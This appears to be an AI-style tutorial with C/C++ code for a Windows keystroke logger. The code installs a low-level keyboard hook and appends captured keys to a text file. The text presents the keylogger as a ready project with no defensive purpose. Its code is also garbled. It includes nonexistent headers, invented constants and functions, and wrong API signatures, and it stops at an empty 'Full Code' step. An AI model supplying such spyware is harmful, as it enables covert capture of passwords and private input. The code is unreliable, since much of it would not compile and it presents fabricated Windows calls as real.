To create a keystroke logger on a Windows computer, follow these steps:

**Step 1: Include Necessary Headers**

Include the required Windows libraries to access keyboard functions.

```c
#include <windows.h>
#include <kernel.h>
#include <user32.h>
#include <stdio.h>
#include <iostream>
#include <ctime>
#include <thread>
#include <queue>
```

**Step 2: Define Constants and Data Structures**

Define constants for key states and a queue for storing keystrokes.

```c
#define MAX KEYS 512
#define FILE_NAME "keystrokes.txt"
static int g_hHook = 0;
static HINSTANCE g_hInst = 0;
static HWND hwnd = 0;
static HANDLE g_hFile = NULL;
static std::queue<char> keystrokes;

// Key states
static int g_keystroke = 0;
static int g_lastKey = 0;
static bool g_shift = false;
static bool g_ctrl = false;
static bool g_alt = false;
```

**Step 3: Keyboard Event Handling Function**

Define a function to handle key presses and releases.

```c
static LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if ((nCode == HCN_KEYDOWN || nCode == HCN_KEYUP) 
    {
        // Check if the key is a modifier
        if (nCode == HCN_KEYDOWN)
        {
            if (wParam == VK_SHIFT || wParam == VK_CTRL || wParam == VK_ALT)
            {
                g_shift = (wParam == VK_SHIFT) ? true : false;
                g_ctrl = (wParam == VK_CTRL) ? true : false;
                g_alt = (wParam == VK_ALT) ? true : false;
            }
        }
        // Capture the key press
        if (wParam > 0 && g_keystroke != wParam)
        {
            g_keystroke = wParam;
            // Check if the key is a modifier and adjust the character
            if (g_shift && (wParam == VK_KEYPAD_1 || wParam == VK_KEYPAD_2 || wParam == VK_KEYPAD_3 || wParam == VK_KEYPAD_0))
            {
                // Handle shifted numbers
                switch(wParam)
                {
                    case VK_KEYPAD_1: keystrokes.push('1'); break;
                    case VK_KEYPAD_2: keystrokes.push('2'); break;
                    case VK_KEYPAD_3: keystrokes.push('3'); break;
                    case VK_KEYPAD_0: keystrokes.push('0'); break;
                }
            }
            else
            {
                keystrokes.push(static_cast<char>(wParam));
            }
            // Write to file
            FILE_APPEND_TO_FILE();
        }
        // Check if the key is released
        else if (wParam == 0)
        {
            g_keystroke = 0;
        }
    }
    return 0;
}
```

**Step 4: File Handling Function**

Implement a function to write keystrokes to a file.

```c
void FILE_APPEND_TO_FILE()
{
    try
    {
        if (!g_hFile)
        {
            g_hFile = fopen(FILE_NAME, "a");
            if (!g_hFile)
            {
                // Handle file not found or permission issues
                printf("Failed to create file.\n");
                return;
            }
        }
        char keystroke = keystrokes.front();
        keystrokes.pop();
        fprintf(g_hFile, "%c", keystroke);
        fflush(g_hFile);
    }
    catch (const std::exception& e)
    {
        printf("Error writing to file: %s\n", e.what());
    }
}
```

**Step 5: Install Keyboard Hook**

Use `SetWindowsHook` to install the hook and start the loop.

```c
int main()
{
    // Initialize the hook
    g_hHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardCallback);

    // Start the loop to handle events
    HWND hwnd = GetMainWnd();
    if (!hwnd)
    {
        printf("Failed to get main window.\n");
        return 1;
    }

    // Sleep to prevent high CPU usage
    Sleep(100);

    while (true)
    {
        // Check if the hook is installed
        if (!g_hHook)
        {
            printf("Hook not installed.\n");
            break;
        }

        // Handle keyboard events
        while (GetMessage(hwnd, &g_keystroke, 0, 0) > 0)
        {
            Sleep(100);
        }

        // Remove the hook and clean up
        UnhookKeyboard(g_hHook);
        if (g_hFile)
        {
            fclose(g_hFile);
            g_hFile = NULL;
        }
        printf("Keyboard hook removed.\n");
        break;
    }

    return 0;
}
```

**Step 6: Full Code**

Putting it all together with necessary setup and error handling.

